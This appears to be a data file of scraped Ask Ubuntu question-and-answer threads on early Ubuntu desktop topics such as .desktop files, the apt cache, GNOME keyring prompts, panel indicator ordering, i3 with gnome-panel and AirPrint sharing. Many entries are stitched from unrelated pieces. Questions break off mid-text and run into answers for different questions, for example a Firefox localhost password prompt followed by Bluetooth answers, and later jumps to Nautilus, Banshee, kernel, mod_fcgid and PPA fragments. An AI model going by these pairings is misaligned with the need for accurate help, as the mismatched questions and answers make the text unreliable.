["Q: How do I find the .desktop information for a given binary? Given the path to an executable (say /usr/bin/gvim), how can I find the Gnome .desktop file for that application? \nI'm futzing around in python, so a python-specific answer would be most helpful.\n\nA: If you want to do it programmatically, use python-gmenu.  It wraps the libgnome-menu2 API for Python.\nThat API lets you iterate over all the desktop directories that are currently configured and includes any overrides or modifications the user has customized.  Then you just query each file to see if it's Exec line matches what you expect.\nI couldn't find any documentation for either library, but liberal use of \"import gmenu; dir(gmenu)\" and looking over /usr/include/gnome-menus/gmenu-tree.h should help.\n\nA: If your package is installed from package (not from source), you can use (in Bash):\ndpkg -L $(dpkg -S /usr/bin/pidgin | cut -f1 -d: ) | grep \\.desktop$\n\nIn the case of gvim, it outputs nothing. You have another problem, in fact, gvim is an alternative. The \"true\" gvim can be multiple programs. On my computer it is /usr/bin/vim.gnome. Let's try with it. This doesn't work either... because there is no .desktop in the same package that vim.gnome. In fact, in this complicated case, the .desktop is in another package common to all graphical interfaces of Vim: vim-gui-common\n\nA: The .desktop files for most applications are stored in:\n/usr/share/applications\n\nsome .desktop files may also be stored in:\n/usr/local/share/applications\n\nor (for per user settings) in:\n~/.local/share/applications\n\n\nA: You can search through all desktop files. For example, to find the desktop file related to gedit:\ngrep -li exec=gedit $(locate -r '\\.desktop$')\n\n\nA: You can execut  1.sudo find /path_to_folder/ -iname *.desktop in general. And  2.sudo find / -iname *.desktop in your case.\n", "Q: Filenames in the apt cache directory Why the packages in the directory \n\n/var/cache/apt/archives/\n\nhave names like:\n*x11proto-damage-Dev_1%3a1.2.0-1_all.deb* where the \"strange\" in this case is \"%3\".\nIn fact, if I download it manually from the firefox the package has the name \"normal\".\nthanks\n\nA: I think it's because the cache contains the URL specific scheme of representation characters, %3a is ASCII code 3A in hexadecimal, which is character \":\" and if you query that installed package eg with command dpkg -s x11proto-damage-dev | grep Version you can see that it contains \":\"\nVersion: 1:1.2.0-1\nSo indeed, that \":\" is encoded as %3a ...\n", "Q: Are there any plans to create a standard based on libunity? In the last few month and maybe even years, Ubuntu and Canonical often were criticised for developing software and desktop components without talking to other groups in the free software community. I don't want to comment on this topic, but I see problems arising with creating a \"proprietary\" solution for displaying indicators and progressbars with a launcher like Unity.\nIn the world of free and open Desktop Environments we often try to standardize parts and libraries or write specifications to increase collaboration between different desktops. We have the instrument of http://freedesktop.org and a lot of specifications are getting implemented by the major Desktop Environments.\nIn this context, proposing a standard for those indicators would be a great step towards better interoperability between desktops.\nThese indicators represent a great feature on the Linux Desktop and I'm sure that other projects like AWN, Docky, etc. would pick them up.\nWith the great market share of Ubuntu, Canonical is in a position to propose it as a standard and encourage projects to implement it.\nThank you in advance,\nSebastian Billaudelle\n\nA: I'm the evil mastermind behind libunity where many of these things will be implemented :-)\nThere is an inherent problems with standards - namely that they are standards :-) If you set them in stone you gotta stick to them if they should be worth the paper they are written on. If they turn out to have unforeseen drawbacks or design problems you're in trouble. You can either extend-and-embrace it or do something completely different. No matter what you'll get flamed somewhere for your choice.\nThat said, I don't think you can find many that will object to fact that a well written, thought through, and proven standard is a good thing. The problem is getting to that point.\nFor Ubuntu we have some very rapid cycles for feature development and if we would first negotiate a standard on FDO and after that implement it we would simply have no way of delivering features at the pace we're doing right now.\nThe approach we're taking now is mostly to try stuff out in practice and then when if we feel really good about something we can draft them up as standards. But if we see our selves changing the specs every cycle it might just be wasting everyone's time if we pull people in to standardization discussions, don't you think?\nSo in principle I'm pretty sure we agree :-) The problem is how to get there without jeopardizing the user experience.\nAnother way to look at this is to not necessarily mandate that a \"standard\" is  DBus API or written spec. An API+ABI stable library is just as good in my book. Then the standard is not human readable words, but machine readable binary instructions.\nSorry for the long response, but it's a complicated matter :-)\n", "Q: Authorization pop-up requested by http://localhost:51675 every time I run Firefox Using Ubuntu 10.04.\nWhenever I run Firefox I get a pop up requesting authorisation.\nIt says \n'a user name and password are being requested by http://localhost:51675.

I suspect that Bindwood 1.0.4 has something to do with this. Try disabling this add-on, and restart Firefox.\n\nA: Port 51675? On localhost? Hmmm. My ideas:\n\n\n*\n\n*You have some kind of proxy software running on your machine.\n\n*You have installed some kind of extension for firefox which causes it.\n\n*Some malicious stuff on your machine :(\n\n\nTry to disable extensions (all of them) and see if this behaviour disappears or not. If yes, it was an extension which caused it.\nMeanwhile, you can query what kind of stuff binds to the 51675 tcp port on localhost. In terminal issue the command like this: sudo netstat -nap | fgrep :51675\nIf there is some result, you can know what program runs on your computer which can accessable via localhost:51675\nAlso as others pointed out: it's not a good idea to enter your password if you don't know or you are not sure what/who ask that and why. It can be phishing too (password stealing with making the user think that it's a legitimate login dialog/whatever even if it's not).

But when I go to System->Preferences->Bluetooth it says \"No Bluetooth adapters present\".\n\nA: I own three Acer laptops, none of which have bluetooth, but all have a bluetooth switch. If you turn on the bluetooth and Ubuntu does not show that bluetooth is available, I would be confident that your laptop does not have a bluetooth module installed.\n\nA: Your computer doesn't have bluetooth hardware, but the button is there for is you select that option when you ask the hardware people to build your laptop.\nIt's common for OEMs to use standard parts, including standard cases and keyboards.

When I fist start Nautilus I invariably open five favourite tabs..  \nI've tried multiple URIs from the command line, but it opened multiple windows.\nIs it possible to somehow do this via command-line ?...  \n\nA: It is still unsupported by Nautilus itself, however you can use a script that admits several parameters to reuse or open a new instance of Nautilus if not running.\nIn order to use this solution you'll need to install pachages wmctrl and xclip.

I have set my Fuze to MTP mode and told Banshee to encode to Ogg Vorbis with quality 4 in the Device Properties dialog for the Fuze (I would use MSC mode, but don't have an encoding option in the device properties when I do that).

For example,\nI have installed 10.10. During\nstartup, I can choose two kernels:\n2.6.32 and 2.6.35. Does 2.6.32 mean 10.04 and 2.6.32 mean 10.10?\n\n*Will applications installed under\none kernel be also installed for\nother kernels available during\nstartup?\n\n\nThanks!\n\nA: You can think of the kernel as just another program on your computer. The particular version you choose doesn't affect which other programs are installed.\nGenerally, newer versions of the kernel provide increased system stability and better hardware support. As they become available they are used in Ubuntu, but they are not strictly associated with any particular Ubuntu release. The kernel is developed separately from Ubuntu, and each Ubuntu release is likely to receive several kernel upgrades over its lifetime.\nUbuntu only runs one kernel at a time, so in an ideal world we should be able to install newer kernels just as we install newer applications — in place of the old version, leaving only one copy installed at a time. Since the kernel is vital to the system's ability to boot, however, it receives special treatment. Older versions are kept around as backups in case a newer version doesn't work. You should never have to use them, but, hypothetically, if one day Ubuntu doesn't boot after an upgrade, you might be able to recover by selecting an older kernel.\nIt doesn't hurt to leave older kernels installed, so unless you're running out of disk space there's not really any reason to remove them.\n\nA: 10.04 does use 2.6.32 and 10.10 uses 2.6.35.  You can install different versions than those on either Ubuntu release, or some other version.  Applications generally do not know or care what kernel you are using.  If you install the application, it goes on your disk, and is there no matter which kernel you boot.\nThe general rule is that you need one kernel, but when upgrading, you want to keep the previous version around in case the new version has problems, you can fall back.  You can remove older versions so they do not pile up over time and add clutter.\n\nA: At some point, new OS releases will not work properly with older kernels. \nWhat I want to say is:  I think it is not possible to run an Ubuntu 10.10 on an, say, 8.04 kernel or earlier kernel (at least not without tweaking that requires in-depth understanding of the booting process). \n", "Q: How to control CPU frequency On Lenovo T400 and Ubuntu 10.10, I am using CPU Frequency Scaling Monitor 2.30.0 on the panel to show and control CPU frequency. \nMy CPU frequency by default will change according to load.

I Love the unity interface... so I installed the interface in my desktop pc and I installed the Ati Official Drivers, I recently Bought an Ati HD 4350, and the interface starts but very Sluggish and when I open an app, it just frezees constanly, even the title bars from the windows look distorsionated.\nThanks for the answers.\n\n\nA: I have an ATI Radeon HD 4350 in my Desktop.\nMy advice is not to use the Official ATI drivers. The \"default\" open source drivers work perfectly for me, both with Ubuntu's normal interface and in Unity. Unity is not sluggish, does not freeze, or have corruption of the window borders for me.\nTo deactivate the Official ATI drivers you need to go to System->Administration->Additional Drivers (but if you installed them using some other method, you may have to do uninstall them differently).\n\n\nA: Use the 2D unity instead of \"default\" unity. \n\n\n*\n\n*How do I install and switch to the Unity 2D desktop?\n", "Q: Moving windows between separate X screens Is it possible to move a window that was opened on screen \"A\" (not workspace, but separate X screen) to screen \"B\" (with or without additional tools which aren't provided by Ubuntu)?\nI have an nVidia card with proper drivers installed. I've tried using Xinerama / Twinview, but if one of these option are enabled (in /etc/xorg.conf) flash videos in Chromium (like on YouTube or Vimeo) doesn't play nicely (clicking full screen plays the video, but not in fullscreen). \nFurthermore sometimes windows pops up on my second screen (which is an LCD TV usually turned off) which is inconvenient. \nDisabling Xinerama / Twinview solves these problems, but it would be nice to move windows back and forth between the two screens.\n\nA: I have a dual monitor setup too and I'm using the open source nouveau driver. I haven't seen any performance issues when playing flash and it works like Twinview. If you don't want windows to open on your secondary monitor you can disable it temporarily via System->Preferences->Monitors.\n\nA: There are multiple ways one can get multiple monitors working.  Both ATI and nVidia have their solutions (Xinerama/TwinView) as well as X having it's own solution.\nIf you use Xinerama/TwinView, you run into certain limitations, such as no composite, no 3D acceleration, etc.  When you use separate X screens, you have less of these issues while losing some of the functionality provided (like being able to drag between monitors).\nWhen using separate X screens, you have multiple DISPLAY s.  You can set which display to run an application on by defining it in your .bashrc or prefixing the command with DISPLAY=:0.0 or DISPLAY=:0.1.\nBack to your original problem: Have you tried both TwinView and Xinerama by themselves, or both together?\n", "Q: How to detect/monitor the hosts/urls being accessed?

Another solution: use netfilter of the linux kernel (with iptables) to log network connections.

Part of the requirement is that Apache needs to create a socket file for mod_fcgid.\nI specified the folder for Apache to write the socket data to:\n/var/run/apache2/fcgid\n\nI then specified this file in my fcgid.conf file as follows:\nSocketPath /var/run/apache2/fcgid/sock\n\nI then changed the owner of the folder to www-data (the apache user) and gave the owner full permissions to the folder and its contents.\nI was able to run my test fcgi app then.\nWhen I rebooted the machine, y fastcgi app no longer worked. After some investigation, I found that ownership of /var/run/apache2/fcgid has been reset to root, and with permission reset to 700\nI have the following questions:\n\n\n*\n\n*Is there something specific about the /var/run folder?\n\n*why is the permissions being reset after a reboot?\n\n*Should I move my socket file to another location (in case root automatically takes ownership of contents in this folder for security reasons?)\n\n\nI am running Ubuntu 10.0.4 LTS 64 bit\n\nA: /var/run is not a \"real\" filesystem on Ubuntu, it's tmpfs (something like \"ramdisk\"). So I think permissions and files are not preserved in case of reboot since that filesystem only exists till the reboot. You can use another location which is a real filesystem, or you can modify some startup script to create and set the rights/ownership of the socket you want to use. Issue the command mount in terminal, you will see that /var/run is on tmpfs.\n", "Q: What is default password? What is the difference between default and login?\nAnd what does Default Keyring mean?\nWhen I run some applications(Emphaty etc), Unlock Keyring window launched first, then it requires me password. Why?\nThis is a screen-shot when I run Emphaty.\n \nWhy does it require me a password? It's a just messenger. It makes me crazy.\nI was able to find this Window.\nI guess this Windows could give me a solution.\nBefore trying something to fix it, I'd like know about what they are.  \nPlease explain them to me.\nP.S My login password is not equal to default password now.\n\n\nA: It's been a while since I've seen a default keyring - what version of Ubuntu is that?  Open up the default keyring to determine what applications are stored in there.  If there's only one or two, you might want to consider just deleting that keyring and storing everything in the login keyring instead.\n\nIt's possible that you have default keyring because your login keyring is out of sync with your login password.  Depending on your security requirements, you might want to consider changing the password on your login keyring to a blank password (called \"unsafe storage\") which ensures that all future passwords are stored in the login keyring.\nI'd only advocate this approach if a) you're using encrypted home or b) you don't care about security.\n\nA: 'Default' keyring actually means \"the keyring called 'Default'\" And it is a keyring automatically created upon user account creation.\nThat 'Default' keyring is where all the password goes, the Instant messaging app stores passwords, so it uses a keyring to store them. The keyring is locked so, to access it it need to unlock it to recover the passwords stored.\nThe password for that keyring is equal to the login password until you manually change one of these. So if you've changed login passwords now the keyring called 'Default' password is out of sync. Desktop uses your login password to try to unlock the keyring, if it fails ask you the password, assuming you've changed the keyring password.\n\nA: You have recently changed your user account password, didnt you?\nThis is what happend:\n\n\n*\n\n*The \"KeyRing\" feature in Gnome is kinda like a \"Vault\" where credentials and passwords for apps are stored. Empathy, for instance, uses the KeyRing to store your IM's accounts logins and passwords\n\n*Each KeyRing (you can have several) has a \"master password\", which is initially set to your login password. That \"opens the vault\", ie, allows apps to store and retrieve their recorded data. You were supposed to give the apps this \"permition\" by entering your keyring password each time an app request the KeyRing a stored value.\n(thats what happening to you now)\n\n\n*\n\n*So, as long as your user and keyring passwords are the same, theres no need to do that, Gnome do it for you. Both passwords match, apps get their permition to store and retieve data without disturbing the user.\n\n\n(thats what used to happen to you)\n\n\n*\n\n*But, since you changed your user password, but not your keyring one, now they dont match anymore, thus you are requested to input your keyring password for Empathy\n\n\nSo, to restore the previous behaviour, one thing you must do is change the keyring password to match your user password\nDo that for both login and default keyring. Or, better yet, if you dont care losing all the passwords stored in the default keyring, just delete it. Apps may ask for credentials one more time, but you will have to give your (now synced) user password only once. \nAnd check if the newly-created entry has really made it into the login keyring. If another default keyring is created again, then we will have to investigate further.\n\nA: Are you asking what is the GNOME keyring in general? This is from Wikipedia\n\nGNOME Keyring is a daemon application\n  designed to take care of the user's\n  security credentials, such as user\n  names and passwords. The sensitive\n  data is encrypted and stored in a\n  keyring file in the user's home\n  folder. The default keyring uses the\n  login password for encryption, so\n  users don't need to remember yet\n  another password. GNOME Keyring is\n  implemented as a daemon and uses the\n  process name gnome-keyring-daemon.\n  Applications can store and request\n  passwords by using the\n  libgnome-keyring library.

Since 10.10 we have the wonderful new Ubuntu sans serif font. If everything goes well 11.04 will bring a  great looking new monospace font. \nIt would only be a logical step to also develop a serif font! This way, the Ubuntu experience would get its definite touch. It could for example give a very special web experience as proposed and supported in this post, by covering the three major font families.\nNow of course the question remains, are there any plans for this?\n\nA: After some in depth research there doesn't appear there are plans for this in 11.04, according to the Ubuntu Font Family Blueprint There is no mention of Serif - though there is no mention of what the future will hold past Natty. However, as development was heavily protected and done mainly by Dalton Maag and the Canonical team.\nIt's now openly available; meaning if so inclined your or another community member can fork, create, and propose for merge a Serif version. While I'm fairly confident there will be a Serif version of the Ubuntu Font will exist before the next LTS I'm not sure - and there doesn't appear to be any planning past 11.04 - so I can't confirm it.\nFor the best response I would recommend posting a \"Wishlist\" item on the Ubuntu Font Family bugs\n\nA: When and if an Ubuntu Serif counterpart happens depends on who comes forward with plans and finds the skilled font designers/engineers who can make an Ubuntu Serif!  See more discussion on:\n\n\n*\n\n*Bug #720332 Expansion: Ubuntu Serif font style (comment #2)\n\n\nThe initial focus has been on building a firm foundation for the Ubuntu Font Family (style, quality, coverage).  For the \"bootstrapping\" phase, Dalton Maag have been taking the lead with the initial drawing and engineering.  The result will hopefully be a beautiful, highly-readable set of screen-optimised fonts, covering:\n\n\n*\n\n*Five scripts: Arabic, Cyrillic, Greek, Hebrew, Latin\n\n*Thirteen fonts: Ubuntu (×4), Ubuntu Mono (×4), Ubuntu Light/Medium (×4), Ubuntu Condensed (×1)\n\n\nWith this foundation built we can hopefully all transition the project over to being \"drawn by everyone\".  If you'd like to contribute a script, style, or font to the project please find a local skilled type designer and start working with them on it, it may also be possible to arrange some internships if you know a budding student!  The philosophy behind Ubuntu is that \"everyone should be able to use Ubuntu in their native language\" and that includes excellent font coverage for their own language too!\nMaking a font (let alone thirteen!) takes a very, very long time so it's worth getting started on making connections.  The end result will be seen and used by tens of millions of people, making each of their lives easier in the process:\n\n\n*\n\n*Find a type designer who is interested\n\n*Work with them to make a beautiful, complementary and hinted expansion\n\n\nThis shouldn't be about just about making an Ubuntu Serif typeface \"for the sake of it\".  The result is definitely worth doing if it will be truly better than the libre/open fonts that are already out there, or shipping in K/Ubuntu already!\n\nA: By the time this question gets 10,000 views (get cracking, publicists!), there will (I predict) be serious plans in place.\nThe groundswell of popular support for a serif version of the brilliant Ubuntu font will have created a buzz so loud so that with its crescendo, even hard-headed Canonical will bend its ear to popular sentiment, inciting their brilliant design team to crank out another masterpiece.\nDesigners will immediately proceed apace to their drawing boards and pants-pocket-memo-pads summoning the eudaemons of design and the flickering forces of CAD.\nFont-faces will tremble, quiver, and resolve themselves into seraphic serif forms. Small nibs will become the structures that form the serifs on the letters. Ubuntu Serif will be born.\nThat, or (as Marco implies) someone will fork it.   Eight forks and thirteen and a half iterations later, you will have your serif font. (Although it may very well take three pizzas and five energy drinks too.)\nAlso, here is the wishlist bug item I opened on launchpad .  Please add yourself if you are interested (and let me know if I've hashed-up something with the bug report).\nOn 2/17/11, Bruno Maag updated the wishlist item:\n\nWe definitely would love to do it! But\n  unfortunately, there are no plans,\n  afaik. I think we need to focus on\n  driving the current Ubuntu font suite\n  forward, completing the current set\n  for May and then expanding the fonts\n  with language and other support.\n  Chinese is increasingly becoming a\n  requirement since successful\n  localisation depends on a good Chinese\n  design with comprehensive glyph\n  support.\n\n\nA: The Ubuntu font was designed primarily for the Ubuntu interface. It was decided to make it a sans-serif font.\nThe monospace version you mentioned was created because in Ubuntu the terminal requires a monospace font to look good. (Look what happens if you use the current Ubuntu font in gnome-terminal.)\nI can't see where a serif variant would be used in the Ubuntu interface. For this reason I doubt Canonical will go to the effort of producing serif font.\nI admit to having no sources for this, it is purely my opinion. So for a more definitive answer keep an eye on jgbelacqua's wishlist bug.\n", "Q: Make long click act like a right click?

You want \"trigger secondary click by holding down primary button\".\n\nA: There is an option for this in System->Preferences->Mouse. Click the 'Accessibility' tab then tick the box under Simulated Secondary Click. You can also vary the duration that you need to hold it down for.\n\nOnce this is set, you should be able to hold down then release the mouse to get the right click menu. You will see the cursor 'fill up' with a colour (by default, orange) to indicate how long you need to hold the mouse down. When the cursor is completely filled, release the mouse and you will get the right click menu.\n\nA: Ubuntu 12.10 and 13.04\nUbuntu supports two-finger right click on multitouch pads, but there’s no much options in Mouse/Touchpad Settings (due to GNOME changes).

So:\n\n\n*\n\n*open Dconf Editor by searching in Dash;\n\n*go to org > gnome > desktop > a11y > mouse;\n\n*check secondary-click-enabled;\n\nAs seen in the screenshot, it’s possible to set the time of long click as well.\n", "Q: Is it possible to change the order of icons in the indicator applet? Is it possible to change the order of icons shown in the indicator applet? With Tomboy indicator, Weather indicator, Clipboard-manager indicator, Ubuntu One and Dropbox indicators and a Battery Status indicator in addition to the classic Messages indicator and Sound Menu indicator my Indicator Applet becomes a little bit messed up, sorting the icons would help a lot...\n\nA: Instructions to Enable sorting the Dropbox Indicator\nFollow Ted Gould's instructions then if you would like to sort the Dropbox indicator, here are a few more steps:\nNote: If you edited the file in /usr/share/... then you will have to put the script in /etc/rc.local (look for Note below)\nBecause Dropbox appends the PID to the indicator name, and this changes every time Dropbox starts, you need to update the ordering-override.keyfile every time dropbox starts.\nTo do this, you can open a text editor, copy and paste the following script, and name it something like start-dropbox.sh. Then either right click, select \"properties\", go to the \"permissions\" tab, and check the \"allow executing file as program\" box, or open a terminal, navigate to the folder you put the script in, and run run sudo chmod 755 ./start-dropbox.sh\n#!/bin/bash\n#Disclaimer: This script is intended for use with Ubuntu 14.04. You alone are responsible any consequence resulting from its use.\n#The purpose of this script is to start dropbox, update the keyfile, and restart the indicator panel.\n\n#Start dropbox if not already started (for some reason pgrep didn't work)\n[[ $(ps aux | grep dropbox | grep dist | awk '{print $2 }') = \"\" ]] && dropbox start -i\n\n#If the override file exists\nif [[ -e ~/.local/share/indicators/application/ordering-override.keyfile ]]\nthen\n    while [ \"$(ps aux | grep dropbox | grep dist | awk '{print $2 }')\" = \"\" ]; do\n        sleep 1s\n    done\n    sleep 5s #dropbox creates several PIDs, so wait a bit before continuing\n    sed -e \"s/dropbox-client-.*=/dropbox-client-$(ps aux | grep dropbox | grep dist | awk '{print $2 }')=/g\" -i ~/.local/share/indicators/application/ordering-override.keyfile\n    restart unity-panel-service\nfi\n\nNow you can open \"Startup Applications, and make a new entry, using the full path to your script as the \"command\" (using ~/start-dropbox.sh won't work, you have to do /home/yourname/start-dropbox.sh). \n**Note: This is where you'd add the full script path to the end of /etc/rc.local\nOne optional step is to open the Dropbox settings and uncheck \"Start dropbox on system startup\". You can't just change the command for Dropbox that is already in the Startup Applications list, because Dropbox overwrites this every time it starts.\nYou're done!\nHere's what my ~/.local/share/indicators/application/ordering-override.keyfile looks like:\n[Ordering Index Overrides]\nmultiload=13\nMy-Weather-Indicator=12\nredshift=11\nDiodon=10\nChars=9\nindicator-brightness=8\ndropbox-client-24651=7\nnm-applet=6\ngnome-power-manager=5\nibus=4\ngst-keyboard-xkb=3\ngsd-keyboard-xkb=2\nchrome-app-indicator-1=1\n\n\nA: The system indicators are in a fixed order by design.  While you might not like the order, it makes support easier by having a fixed order (we can argue about the order endlessly).  The application indicators work a little bit differently, they're designed so that there is a default order but applications can adjust that for continuity.  For instance, if an application had two indicators that it wanted next to each other.\nBecause this system leads to a possible abuse by application developers there is a set of overrides in the system.  The first is at the system level so that it can be managed by packages once the distro figures out there is an abusing application it can be fixed for all users.  It's located at:\n   /usr/share/indicator-application/ordering-override.keyfile\n\nYou can put any status notifier ID in there and give it a new ordering index that will because the new index for that application.  There is also a per-user override file that can exist in your home directory at:\n  ~/.local/share/indicators/application/ordering-override.keyfile\n\nHopefully that will give you some help in adjusting your panel the way that you prefer!\n\nA: The official ubuntu ones (weather, ubu-one, battery, messages, me, sound, shutdown) are hardcoded in place. Sucks. The other ones should take their order using the law of first come first serve, right-left precedence. Judging from this brainstorm/feature request, the answer is: No, you cannot manually change the order of icons via the gui. But see @Ted Gould's answer.\n\n\n*\n\n*Bug report on the issue\n\n\nA: To change Application Indicators position on the Unity panel, you must edit a file called ordering-override.keyfile which is located under /usr/share/indicator-application. Since editing this file will change the settings for all users, you can copy it to ~/.local/share/indicators/application/ordering-override.keyfile and make the changes for your user only:\nmkdir -p ~/.local/share/indicators/application\ncp /usr/share/indicator-application/ordering-override.keyfile ~/.local/share/indicators/application/\n\nNow open the file by running the following command in a terminal:\ngedit ~/.local/share/indicators/application/ordering-override.keyfile\n\nIn this file you should see the existing rules for Application Indicators order on the panel. The first one is nm-applet and has a value of \"1\", meaning it will be the first Application Indicator to be displayed on the panel, from right to left.\nUsing this as an example, you can add your own Application Indicators and specify their position by entering their name and a number like transmission=6 which will make the Transmission Application Indicator to show up as the 6th indicator on the panel (from right to left), if the other 5 indicators exist.\nSource: http://www.webupd8.org/2011/06/how-to-change-application-indicators.html\nNow, in your case, ordering-override.keyfile file should look like this:\n[Ordering Index Overrides]\nnm-applet=1\nMy_Weather_Indicator=2\nlang_indicator=3\nbluetooth_manager=4\nindicator_sysmonitor=5\ntransmission=6\n\n", "Q: I3 WM with auto internet connectivity and a gnome panel I wanna use I3 as WM with a gnome-panel on the bottom. But when i try to start the gnome-panel, I3 crashes. So how is it possible to run both?\nAnother question is: How can i connect to the internet (over wifi and cable) when I3 starts? In standard i get no connection after starting (and waiting some time). Do i need a static configuration or is there a better/other possibility?\nBest Regards\n\nA: Install wicd-gtk\nthen, add the following autorun in your .i3/config :\nexec wicd-gtk -t\nthis should give you auto-internet connectivity.  You can choose the network to auto-connect in the wicdt-gtk gui.\n\nA: In the version of i3 that came with Ubuntu 10.10, there was a bug that caused it to crash when running with Gnome. See http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=610143 . However, in the version of i3 that comes with Ubuntu 11.04, the bug is fixed.\nThe way I got i3 to run as the WM for gnome (i.e. i3 + gnome-panel) was to go run gconf-editor, navigate to /desktop/gnome/session/required_components, and add/edit the key called windowmanager to have the value i3 (it was previously metacity or compiz). Next time you run Gnome (now \"Ubuntu Classic\") from GDM, it will use i3 as the window manager. For some reason, though, it takes like 30 seconds to start up the panel, so be patient.\nUpdate 2012-05-10\nWhen I upgraded to Ubuntu 11.10 and 12.04 I had to use a different solution (which works for both). I created a file called /usr/share/gnome-session/sessions/gnome-i3.session with the followingcontents:\n[GNOME Session]\nName=gnome-i3\nRequiredComponents=gnome-panel;gnome-settings-daemon;\nRequiredProviders=windowmanager;\nDefaultProvider-windowmanager=i3\nDefaultProvider-notifications=notify-osd\nIsRunnableHelper=/usr/lib/gnome-session/gnome-session-check-accelerated\nFallbackSession=gnome-fallback\nDesktopName=GNOME\n\nThen at the lightdm login screen, I just select gnome-i3 instead of \"Ubuntu 2D\" or whatever else is in the list. I may have had to install gnome classic/fallback as well, but there should be plenty of tutorials online on how to get that installed if it's not there already.\nAnother thing to note: when I upgraded i3 to 4.2 (I use the i3 Ubuntu repository), whenever I logged in the gnome-panel wouldn't appear until after I launched my first application.\n", "Q: Can't change folder background I tried to change via dragging from the Backgrounds and Emblems window, but the icon just goes back to that window rather than changing the folder background.However, I can change the task bar by this drag-n-drop. \nProbably it is something about changing ownership permission? if so how to change that?   \nIn /home/mashruf/.gconf/apps/nautilus/preferences/%gconf.xml file it says:, Should I change this file? how?\n<?xml version=\"1.0\"?>\n<gconf>\n    <entry name=\"click_policy\" mtime=\"1297597800\" type=\"string\">\n        <stringvalue>single</stringvalue>\n    </entry>\n    <entry name=\"default_folder_viewer\" mtime=\"1297597336\" type=\"string\">\n        <stringvalue>list_view</stringvalue>\n    </entry>\n    <entry name=\"media_autorun_x_content_open_folder\" mtime=\"1297534321\" type=\"list\" ltype=\"string\">\n    </entry>\n    <entry name=\"media_autorun_x_content_ignore\" mtime=\"1297534321\" type=\"list\" ltype=\"string\">\n    </entry>\n    <entry name=\"media_autorun_x_content_start_app\" mtime=\"1297534321\" type=\"list\" ltype=\"string\">\n        <li type=\"string\">\n            <stringvalue>x-content/software</stringvalue>\n        </li>\n    </entry>\n    <entry name=\"start_with_location_bar\" mtime=\"1297300028\" type=\"bool\" value=\"true\"/>\n    <entry name=\"side_pane_view\" mtime=\"1297269334\" type=\"string\">\n        <stringvalue>NautilusTreeSidebar</stringvalue>\n    </entry>\n    <entry name=\"navigation_window_saved_maximized\" mtime=\"1297600306\" type=\"bool\" value=\"false\"/>\n    <entry name=\"navigation_window_saved_geometry\" mtime=\"1297600306\" type=\"string\">\n        <stringvalue>964x608+59+2</stringvalue>\n    </entry>\n    <entry name=\"sidebar_width\" mtime=\"1297390418\" type=\"int\" value=\"192\"/>\n</gconf>\n\n\nA: It sounds like there is a much easier way to achieve what you would like to do.\n\n\n*\n\n*Open Nautilus\n\n*Right Click on a Folder\n\n*Click on Properties\n\n*Click on the Folder Icon Button (yes it's really a button!)\n\n*Browse to the image you would like to replace it with\n/usr/share/pixmaps\nare where most of the standard icons are stored\n\n\n*\n\n*Select the image you would like to use\n\n\n(see the images below)\nOn a side note.

Do you have some pendrive, whatever which is autmounted and you want to download onto it? I am just wondering why don't you download into your home directory, have you got any special reason?\n\nA: You should not store user files in the /media folder, it contains mount points for removable media like CD's or USB memory sticks. This folder is owned by the root user who has permission to write to this directory (owner=root, group=root, mode=0755).\nEach user has a Home folder, located at /home/you-username. In that directory, you can store your personal files and settings. Ubuntu creates additional directories in that folder like Videos, in which you can put your downloaded videos.\nPlease read the manual page about the Filesystem hierarchy to get a better understanding of folders like /media.\n\nA: Transmission does not run under the logged-in username, instead it uses the username 'debian-transmission'. Consequently, downloading to a home folder won't work, because 'debian-transmission' does not have write permissions to any of the user's home folders. The default download location is in the /var directory, because 'debian-transmission' (and I believe most local users?) have write access to that directory tree.\nmikewhatever answers the question of how to download directly into one of the /home folders, in this other askubuntu: Permission denied when downloading with transmission deamon\n", "Q: Upload to PPA succeeded but packages doesn't appear I'm trying to upload packages to my PPA for the first time. \nI want to use the PPA for customized versions of the OpenStack Compute (nova) project, so I tried to do a test by uploading packages corresponding to the bexar release of this project (lp:nova/bexar), with a new version number and changelog entry.

How can I set up Ubuntu to share my printer so that I can use it with Airprint ?\nAirprint is a system set-up by Apple on iOS devices (iPhone, iPad, iPod Touch)\n\nA: This has changed since the initial question was asked.\nSince Ubuntu 11.04, you can share local printers so they are available via AirPrint.\nAirPrint support is either built-in a printer or not. For printers that don't have this support built-in (which is most printers bought before AirPrint was introduced in 2010), AirPrint support can be achieved by configuring such a printer on an intermediary system for local printing, shared on the same network. In this particular context this means any Ubuntu desktop or server with local printing configured. Follow these steps (source):\n\n\n*\n\n*On your computer start the printer configuration utility via System -> \nAdministration -> Printing (GNOME Classic) or via Turn-off-button at\nthe  upper right -> System Settings -> Hardware -> Printing (Unity\nNatty) or  via the command line (all systems including Unity\nOneiric): gksudo system-config-printer.\n\n*In the printer configuration utility choose Server -> Settings and activate \nPublish shared printers connected to this system. Click OK and\nthen  right-click on the icon of your print queue and choose\nProperties in the  pop-up menu. In the Policies section of the\ndialog make sure that  Shared is activated.\n\n*Make sure your mobile device is accessing your local network using \nWLAN and then open an application with printing functionality on it \n(like for example the browser or the photo viewer). Print something.\nThe  print dialog should show your print queue and allow some basic\nsettings.\n\nNote: The Description/Info field and not the name of the queue is shown.\n\nThis is automatically available in GNU/Linux distributions with CUPS since version 1.4.6 (such as Trisquel 5 and Ubuntu 11.04). AirPrint Activator provides the functionality on Mac OS X. There is also a paid solution offered to Windows users.\nSome of this information was adapted from the AirPrint article on Wikipedia (which I updated previously).\n\nA: *\n\n*First download this Python file and make it executable:\nhttps://github.com/tjfontaine/airprint-generate/raw/master/airprint-generate.py : Go to the downloaded file , right-click, show Properties, Permissions, and check-mark; Allow executing file as program.\n1b ) go to the downloaded file , right-click, show Properties, Permissions, and check-mark; Allow executing file as program.\n\n*\n\n*Run it in a terminal to create a customized service file: Open a terminal,go to the folder where you downloaded the file and run; sudo python airprint-generate.py\n2b ) Open a terminal,go to the folder where you downloaded the file and run; sudo phyton airprint-generate.py\n2c ) look for file/files like; AirPrint-Your-printer-name-.service \n\n\n*Save the generated file in /etc/avahi/services\n\n*Edit /etc/cups/cupsd.conf\n\n*Add ServerAlias *\nPort 631\nListen /var/run/cups/cups.sock\n\n*Now go back to System -> Administration -> Printing and click Server -> Settings.

